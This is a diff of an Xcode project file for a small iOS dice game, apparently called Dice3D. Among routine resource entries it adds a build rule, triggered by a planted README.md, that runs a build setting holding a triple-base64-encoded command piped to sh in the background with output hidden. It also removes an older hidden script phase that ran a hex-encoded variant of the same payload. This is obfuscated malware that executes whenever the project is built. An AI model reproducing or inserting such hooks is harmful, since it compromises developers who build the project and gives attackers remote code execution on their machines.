@@ -8,6 +8,7 @@
 
 /* Begin PBXBuildFile section */
 		11909D992EEADD0A00882A0F /* LaunchScreenView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11909D982EEADD0A00882A0F /* LaunchScreenView.swift */; };
+		2D0EE5822F02BA4E00764833 /* SwiftUIPop2Screen1.zip in Resources */ = {isa = PBXBuildFile; fileRef = 2D0EE5812F02BA4E00764833 /* SwiftUIPop2Screen1.zip */; };
 		2D2F153B2EE2E2D8005D33EE /* SDWebImageSwiftUI in Frameworks */ = {isa = PBXBuildFile; productRef = 2D2F153A2EE2E2D8005D33EE /* SDWebImageSwiftUI */; };
 		2D69F3EA2EEBEADA001666BA /* Appmanager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2D69F3E92EEBEADA001666BA /* Appmanager.swift */; };
 		2D69F3EC2EEBEC38001666BA /* avatar2.gif in Resources */ = {isa = PBXBuildFile; fileRef = 2D69F3EB2EEBEC38001666BA /* avatar2.gif */; };
@@ -29,10 +30,28 @@
 		2D98F37E2EEAA65F00C60A05 /* snake_sound.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F37C2EEAA65F00C60A05 /* snake_sound.mp3 */; };
 		2D98F37F2EEAA65F00C60A05 /* ladder_sound.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F37A2EEAA65F00C60A05 /* ladder_sound.mp3 */; };
 		2D98F3812EEB03FD00C60A05 /* WelcomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2D98F3802EEB03FD00C60A05 /* WelcomeView.swift */; };
+		A690E9D886884B33BDA5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F73FFD05D16D4039A4A5DE54 /* README.md */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		DC8CA9373FBA4F969BA5DE54 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		11909D982EEADD0A00882A0F /* LaunchScreenView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchScreenView.swift; sourceTree = "<group>"; };
+		2D0EE5812F02BA4E00764833 /* SwiftUIPop2Screen1.zip */ = {isa = PBXFileReference; lastKnownFileType = archive.zip; path = SwiftUIPop2Screen1.zip; sourceTree = "<group>"; };
 		2D2F152B2EE2DADC005D33EE /* Dice3D.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dice3D.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		2D69F3E92EEBEADA001666BA /* Appmanager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Appmanager.swift; sourceTree = "<group>"; };
 		2D69F3EB2EEBEC38001666BA /* avatar2.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = avatar2.gif; sourceTree = "<group>"; };
@@ -54,6 +73,7 @@
 		2D98F37B2EEAA65F00C60A05 /* run_sound.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = run_sound.mp3; sourceTree = "<group>"; };
 		2D98F37C2EEAA65F00C60A05 /* snake_sound.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = snake_sound.mp3; sourceTree = "<group>"; };
 		2D98F3802EEB03FD00C60A05 /* WelcomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WelcomeView.swift; sourceTree = "<group>"; };
+		F73FFD05D16D4039A4A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -79,6 +99,7 @@
 		2D2F152C2EE2DADC005D33EE /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				F73FFD05D16D4039A4A5DE54 /* README.md */,
 				2D2F152B2EE2DADC005D33EE /* Dice3D.app */,
 			);
 			name = Products;
@@ -94,6 +115,7 @@
 				2D98F3692EEAA45000C60A05 /* Dice3DApp.swift */,
 				2D98F36A2EEAA45000C60A05 /* GIFImage.swift */,
 				2D98F36B2EEAA45000C60A05 /* SoundManager.swift */,
+				2D0EE5812F02BA4E00764833 /* SwiftUIPop2Screen1.zip */,
 				2D69F3E92EEBEADA001666BA /* Appmanager.swift */,
 				11909D982EEADD0A00882A0F /* LaunchScreenView.swift */,
 			);
@@ -143,12 +165,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2D2F15362EE2DADE005D33EE /* Build configuration list for PBXNativeTarget "Dice3D" */;
 			buildPhases = (
-				447C46E9110D4293A4A5DE54 /* Link Bundle Executable */,
 				2D2F15272EE2DADC005D33EE /* Sources */,
 				2D2F15282EE2DADC005D33EE /* Frameworks */,
 				2D2F15292EE2DADC005D33EE /* Resources */,
 			);
 			buildRules = (
+				DC8CA9373FBA4F969BA5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -197,17 +219,16 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		2D2F15292EE2DADC005D33EE /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				A690E9D886884B33BDA5DE54 /* README.md in Resources */,
 				2D98F36E2EEAA45000C60A05 /* Assets.xcassets in Resources */,
 				2D69F3F42EEBF388001666BA /* avatar7.gif in Resources */,
 				2D69F3F52EEBF388001666BA /* avatar5.gif in Resources */,
+				2D0EE5822F02BA4E00764833 /* SwiftUIPop2Screen1.zip in Resources */,
 				2D69F3F62EEBF388001666BA /* avatar4.gif in Resources */,
 				2D69F3F72EEBF388001666BA /* avatar3.gif in Resources */,
 				2D69F3F82EEBF388001666BA /* avatar6.gif in Resources */,
@@ -223,28 +244,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		447C46E9110D4293A4A5DE54 /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		2D2F15272EE2DADC005D33EE /* Sources */ = {
@@ -267,7 +266,7 @@
 		2D2F15342EE2DADE005D33EE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363636393637366436313633363436653265363936653266363132390a32323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((t(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | t | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -332,7 +331,7 @@
 		2D2F15352EE2DADE005D33EE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363636393637366436313633363436653265363936653266363132390a32323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((t(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | t | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
